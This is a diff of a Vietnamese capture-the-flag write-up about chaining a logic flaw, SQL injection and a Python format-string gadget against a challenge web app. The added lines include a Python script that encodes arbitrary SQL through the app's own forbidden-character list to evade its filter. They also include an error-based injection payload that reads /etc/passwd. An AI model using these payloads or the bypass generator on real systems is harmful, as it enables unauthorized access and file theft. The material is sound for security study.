@@ -6,7 +6,7 @@
 # TL;DR
 
 Mình giải challenge này bằng cách kết hợp nhiều lỗ hỏng khác nhau, mỗi lỗ hỏng lại mở ra nhiều điều thú vị để mình khám phá. Bắt đầu từ 
-**Business Logic Flaws -> SQL injection -> Arbitrary file write/read -> Python Format String Vulnerability -> Remote Code Execution** 
+**Business Logic Flaws -> SQL injection + Python Format String Gadget -> Arbitrary file write/read  -> Remote Code Execution** 
 
 # 1. Reconnaissance!!
 
@@ -157,7 +157,7 @@ Bạn có thể thấy, thật tuyệt vời khi chúng ta có thể làm một 
 
 Điều này không khác gì mỏ vàng vì kết hợp với phân tích ở trước, chúng ta có thể bypass hoàn toàn bộ lọc bằng cách dùng chính list **FORBIDDEN_CHARACTERS** trong class **Input Validator** để bypass và chèn được kí tự bị cấm vào query của mình, và có được lỗ hỏng đầu tiên - ***SQL injection***:
 
-Payload:
+**Payload:**
 username : admin
 password : `
 `{a}{a.FORBIDDEN_CHARACTERS[5]}{a.FORBIDDEN_CHARACTERS[3]}OR{a.FORBIDDEN_CHARACTERS[3]}1=1{a.FORBIDDEN_CHARACTERS[3]}{a.FORBIDDEN_CHARACTERS[10]}{a.FORBIDDEN_CHARACTERS[10]}{a.FORBIDDEN_CHARACTERS[3]}{a.FORBIDDEN_CHARACTERS[10]}`
@@ -167,4 +167,59 @@ password : `
 ![[Attachments/Pasted image 20261119000522.png]]
 
 Tuyệt vời!!! Mình đã đăng nhập được với tài khoản admin mặc dù vào thì chỉ hiện ra trang 404 nhưng cũng đã giúp mình xác nhận được SQL injection !!
+
+Một script đơn giản để bạn có thể tự tạo payload bất kì cho riêng mình:
+```python
+FORBIDDEN = [
+    '"', '(', ')', ' ', ',', "'",
+    '\\', '/', '*', '+%', '-', ';', '#'
+]
+
+def bypass(payload, key="a"):
+    result = ""
+
+    for char in payload:
+        if char in FORBIDDEN:
+            index = FORBIDDEN.index(char)
+            result += f"{{{key}.FORBIDDEN_CHARACTERS[{index}]}}"
+        else:
+            result += char
+
+    return f"{{{key}}}" + result
+
+
+if __name__ == "__main__":
+    while True:
+        payload = input("Nhap payload ban can bypass!!!! =>  ")
+        print(bypass(payload))
+        print("="*10)
+        print("\n")
+
+```
+
+
+Oke, giờ đã có SQL injection, trên lý thuyết chúng ta có thể đọc toàn bộ Database rồi, nhưng dường như Database của app không có gì ngoài account admin:))
+![[Attachments/Pasted image 20261119001428.png]]
+
+Lúc này nhìn vào source code ta còn thấy App còn in thẳng lỗi database nếu query bị lỗi:
+```python
+        except mysql.connector.Error as database_error:
+            flash(f"Database query failed: {database_error}", 'error')
+```
+
+Không còn gì tuyệt vời hơn khi chúng ta có thể tận dụng Error-based SQL injection và đọc mọi file mình muốn:
+
+**Payload:**
+username : admin
+password : 
+```
+{a}x{a.FORBIDDEN_CHARACTERS[5]}{a.FORBIDDEN_CHARACTERS[3]}UNION{a.FORBIDDEN_CHARACTERS[3]}SELECT{a.FORBIDDEN_CHARACTERS[3]}1{a.FORBIDDEN_CHARACTERS[4]}EXTRACTVALUE{a.FORBIDDEN_CHARACTERS[1]}1{a.FORBIDDEN_CHARACTERS[4]}CONCAT{a.FORBIDDEN_CHARACTERS[1]}0x7e{a.FORBIDDEN_CHARACTERS[4]}LOAD_FILE{a.FORBIDDEN_CHARACTERS[1]}{a.FORBIDDEN_CHARACTERS[5]}{a.FORBIDDEN_CHARACTERS[7]}etc{a.FORBIDDEN_CHARACTERS[7]}passwd{a.FORBIDDEN_CHARACTERS[5]}{a.FORBIDDEN_CHARACTERS[2]}{a.FORBIDDEN_CHARACTERS[4]}0x7e{a.FORBIDDEN_CHARACTERS[2]}{a.FORBIDDEN_CHARACTERS[2]}{a.FORBIDDEN_CHARACTERS[4]}3{a.FORBIDDEN_CHARACTERS[10]}{a.FORBIDDEN_CHARACTERS[10]}{a.FORBIDDEN_CHARACTERS[3]}{a.FORBIDDEN_CHARACTERS[10]}
+```
+(Dịch ra: x' UNION SELECT 1,EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('/etc/passwd'),0x7e)),3-- -)
+
+
+![[Attachments/Pasted image 20261119002042.png]]
+
+Ồ, vậy là có đọc file rồi, giờ thì mình thử viết file xem sao nhỉ?
+
 
